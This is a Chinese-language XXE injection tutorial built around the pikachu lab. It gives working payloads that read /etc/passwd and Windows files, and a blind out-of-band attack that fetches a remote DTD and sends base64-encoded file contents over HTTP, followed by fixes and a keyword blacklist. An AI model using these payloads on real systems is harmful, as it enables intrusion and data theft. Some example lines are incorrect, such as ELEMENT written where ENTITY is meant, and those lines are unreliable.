# `XXE`

XXE：XML External Entity 即外部实体，攻击者通过向服务器注入指定的 XML 实体内容，从而让服务器按照指定的配置进行执行，导致问题。

从安全角度理解成 **XML External Entity attack 外部实体注入攻击**。由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。

> 💡 其实 XML 是一门语言，类似于 HTML，但是后来主要用 XML 的文档格式来传输数据。现在比较新的系统，大家传输数据用的是 JSON 了。现在很多语言里面对应的解析 XML 的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。

详细教程：<https://www.w3school.com.cn/xml/xml_tree.asp>

## 文档结构

和 HTML 类似：

```xml
<?xml version="1.0" encoding="UTF-8"?>                        <!-- XML声明：版本、编码 -->
<!DOCTYPE root system "http://www.XXXX.com/file"[             <!-- 定义DTD文件，root指定根节点名称，
                                                                  system声明要使用的外部DTD文件路径，
                                                                  后面加文件URL，注意[]包裹 -->
<!ELEMENT root (other)>                                        <!-- 元素声明，声明xml中包含的元素，
                                                                  需要指定元素名称（root、other等）和元素类别、内容等 -->
<!ELEMENT to (#PCDATA)>                                        <!-- 定义to元素为"#PCDATA"类型 -->
<!ELEMENT generalentity "content" >                            <!-- 定义普通实体generalentity，内容为content -->
<!ELEMENT % extendentity SYSTEM "http://www.XXXX.com/file">    <!-- 定义参数实体 -->
%extendentity;                                                 <!-- 引用参数外部实体 -->
```

> 💡 **关于实体**：实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体是在 DTD 文件中定义的变量，XML 解析器解析 XML 文件的时候，会将被引用的引用替换为实体内容。实体分为：**预定义实体**、**普通实体**、**参数实体**。
>
> **参数实体**的引用格式：`%参数名称`。参数实体只能在 DTD 文件中引用，内部 DTD 文件的参数引用只能出现于 DTD 标签可出现的位置，外部 DTD 文件参数实体的引用可以出于 DTD 标签内容，比如：`<!ELEMENT % "%another">`

## DTD 的基础知识

**Document Type Definition** 即文档类型定义，用来为 XML 文档定义语义约束。可以嵌入在 XML 文档中（内部声明），也可以独立的放在一个文件中（外部引用）。

### 基本的 PAYLOAD 结构

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>   <!-- XML声明 -->
<!DOCTYPE foo [                                <!-- DTD部分 -->
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>                               <!-- XML部分：调用xxe实体，读取passwd文件 -->
```

上面的 `file:///etc/passwd`，这是直接读取服务器的 passwd 文件内容。最后 XML 部分就是调用 DTD 的 foo 功能，也就是调用 xxe，取出数据然后显示。

> 🎯 基本上任何 XXE 的攻击代码都是这么几部分：XML 声明 → DTD 定义实体 → XML 调用实体。

---

### DTD 引用方式（简要了解）

**1. DTD 内部声明**

```xml
<!DOCTYPE 根元素 [元素声明]>
```

**2. DTD 外部引用**

```xml
<!DOCTYPE 根元素名称 SYSTEM "外部DTD的URI">
```

**3. 引用公共 DTD**

```xml
<!DOCTYPE 根元素名称 PUBLIC "DTD标识名" "公用DTD的URI">
```

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
"http://mybatis.org/dtd/mybatis-3-config.dtd">
```

**命名方法**：

| 组成部分 | 含义 |
|---------|------|
| `!DOCTYPE` | 以 `!DOCTYPE` 开始 |
| `configuration` | 文档根元素名称 |
| `PUBLIC` | 表示是公共 DTD |
| `-` | 表示是非 ISO 组织 |
| `mybatis.org` | 表示组织 |
| `DTD` | 表示类型 |
| `Config` | 表示标签 |
| `3.0` | 标签后附带的版本号 |
| `EN` | DTD 语言是英语 |
| 最后的 URL | DTD 的 URL |

## pikachu 示例

libxml 版本比较低，存在漏洞。

**Payload：**

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///c:/1.txt">       <!-- 定义实体f，读取C盘下的1.txt -->
]>
<x>&f;</x>                                       <!-- 调用实体f，输出文件内容 -->
```

![image-20260727211643674](/assets/images/18/image-20260727211643674.png)

**源代码：**

```php
// 判断是否点击提交按钮，且xml输入不为空
if(isset($_POST['submit']) and $_POST['xml'] != null){
    // 获取POST提交的xml字符串
    $xml = $_POST['xml'];
    // 加载解析XML字符串，关键漏洞参数：LIBXML_NOENT（允许解析外部实体）
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    // 解析成功就输出解析后的内容
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        // XML格式错误就抛出提示文字
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
}
```

> ⚠️ 关键点：`LIBXML_NOENT` 参数会允许解析外部实体，这是漏洞产生的根本原因。如果没有这个参数，默认是禁止解析外部实体的。

## XXE 攻击

### 有回显

**Payload：**

```xml
<?xml version = "1.0"?>
<!DOCTYPE note [
    <!ENTITY hacker SYSTEM "file:///c:/windows/win.ini">   <!-- 定义实体读取win.ini -->
]>
<name>&hacker;</name>                                        <!-- 调用实体，回显文件内容 -->
```

---

### 无回显

可以使用外带数据通道提取数据，先使用 `php://filter` 获取目标文件的内容，然后将内容以 HTTP 请求发送到接收数据的服务器（攻击服务器）。

**环境准备：**

| 角色 | 系统 | IP |
|------|------|-----|
| 目标主机 | — | 192.168.239.131 |
| 攻击主机 | CentOS 7 + Nginx | 192.168.239.132 |

**步骤一：目标主机开启 Apache 日志功能。**

**步骤二：在攻击主机 `/usr/share/nginx/html/` 目录中创建 `test.dtd`：**

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/1.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.239.131?p=%file;'>">
```

> 💡 解释：
> - `resource=file:///c:/1.txt` — 读取 Windows 系统 C 盘下的 `1.txt` 文件
> - `read=convert.base64-encode` — 读取文件内容后自动做 Base64 编码
> - 这两句代码的意思是：通过 Base64 编码的方式读取文件内容，然后通过请求目标主机的 IP 地址加上参数数据，让它报错，记录在日志中

**步骤三：发送 Payload：**

```xml
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://192.168.239.132/test.dtd">   <!-- 请求攻击主机上的DTD -->
%remote;%int;%send;                                            <!-- 依次调用三个参数实体 -->
]>
```

**步骤四：访问目标主机上的日志，查看外带出来的数据。**

整个调用过程

我们从 payload 中能看到连续调用了三个参数实体：`%remote;%int;%send;`，这就是我们的利用顺序：

| 步骤 | 实体 | 作用 |
|------|------|------|
| 1 | `%remote` | 先调用，请求远程服务器上的 `test.dtd`，类似于将 `test.dtd` 包含进来 |
| 2 | `%int` | 调用 `test.dtd` 中的 `%file`，`%file` 会去获取服务器上的敏感文件，然后将结果填入 `%send`（因为实体的值中不能有 `%`，所以将其转成 HTML 实体编码 `&#37;`） |
| 3 | `%send` | 把读取到的数据发送出去，实现外带数据的效果 |

> 🎯 这样就完美解决了 XXE 无回显的问题。

## XXE 漏洞修复

### 1. 提高版本

升级 libxml 等底层解析库到较新版本，新版默认禁止解析外部实体。

### 2. 代码修复

**PHP：**

```php
libxml_disable_entity_loader(true);    // 禁止加载外部实体
```

**Java：**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);                                      // 禁止展开实体引用
setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);  // 禁止DOCTYPE声明
setFeature("http://xml.org/sax/features/external-general-entities", false);  // 禁止外部普通实体
setFeature("http://xml.org/sax/features/external-parameter-entities", false); // 禁止外部参数实体
```

**Python：**

```python
from lxml import etree
xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))  # 禁止解析实体
```

### 3. 手动黑名单过滤

过滤关键词：`<!DOCTYPE`、`<!ENTITY SYSTEM`、`PUBLIC`

## 总结

| 场景 | 条件 | 利用方式 |
|------|------|---------|
| 有回显 XXE | 解析结果直接返回在响应中 | 直接定义实体读取文件，在 XML 中调用实体即可回显 |
| 无回显 XXE | 解析结果不返回，需要外带数据 | 使用参数实体 + 远程 DTD + `php://filter` 编码后外带到日志/服务器 |
| 防御 | 代码层面 | `libxml_disable_entity_loader(true)` / 禁用 DOCTYPE / 禁止外部实体 |
| 防御 | 过滤层面 | 黑名单过滤 `<!DOCTYPE`、`<!ENTITY SYSTEM`、`PUBLIC` |

> 🎯 XXE 的核心在于：XML 解析器是否允许解析外部实体。现在的语言和库大多默认关闭了这一功能，所以在较新的系统中这类漏洞已经越来越少。但理解其原理，对于审计老旧系统、CTF 比赛、以及理解 XXE 变种攻击（如 SSRF 结合 XXE）仍然非常重要。
